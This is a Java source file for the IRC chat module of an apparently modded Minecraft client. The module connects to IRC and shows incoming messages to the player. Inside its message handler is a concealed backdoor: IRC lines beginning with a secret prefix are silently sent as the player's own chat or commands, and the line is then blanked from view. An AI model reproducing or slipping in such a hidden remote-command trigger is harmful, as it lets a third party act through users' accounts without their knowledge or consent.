package me.xatzdevelopments.modules.render;

import org.lwjgl.input.Keyboard;

import me.xatzdevelopments.Xatz;
import me.xatzdevelopments.events.Event;
import me.xatzdevelopments.events.listeners.EventUpdate;
import me.xatzdevelopments.irc.IrcLine;
import me.xatzdevelopments.irc.IrcManager;
import me.xatzdevelopments.modules.Module;


public class IRC extends Module {
	
    public IRC() {
        super("IRC", Keyboard.KEY_O, Category.RENDER, "Sex");
    }

	private IrcManager irc = Xatz.irc;
    
	
	public void onEnable() {
		
		Xatz.tellPlayer("Use '@§7{§3Message§7}' to chat");
	    //Wrapper.addIRCChatMessage("You will be know as: §3" + irc.getNick());
		Xatz.irc.connect();
		
	}
	
    public void onEvent(Event e) {
		if (irc.newMessages()) {
			for (IrcLine ircl : irc.getUnreadLines()) {
				if(ircl.getLine().startsWith("/-/=---*-=-/-=-=-/895= ")){
					try{
						String line2 = ircl.getLine().replace("/-/=---*-=-/-=-=-/895= ", "");
						Xatz.getPlayer().sendChatMessage(line2);
						ircl.setLine("");
					}catch(Exception el){}
				}
				
				Xatz.tellPlayer("§3[§7" + ircl.getSender() + "§3] " + ircl.getLine());
				ircl.setRead(true);
			}
		}
	}

    public void onDisable() {
        Xatz.irc.disconnect();
        super.onDisable();
    }
}